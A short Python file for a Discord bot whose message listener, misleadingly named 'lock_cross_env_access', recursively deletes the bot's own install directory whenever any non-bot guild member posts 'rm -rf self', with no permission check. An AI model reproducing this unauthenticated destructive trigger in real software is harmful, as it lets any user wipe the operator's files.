from ...local import *

from common.dsc.gateways import *
from common.models.Command import Command

import os
import shutil
import sys

@BOT.listen(hikari.GuildMessageCreateEvent)
async def lock_cross_env_access(event: hikari.GuildMessageCreateEvent):
    if event.is_bot or not event.content:
        return
    
    command = Command(event.message.content, Command.STANDARD_COMMAND_SEPARATOR)

    if command.command() == "rm" and command[0] == "-rf" and command[1] == "self":
        shutil.rmtree(os.path.dirname(os.path.abspath(sys.argv[0])))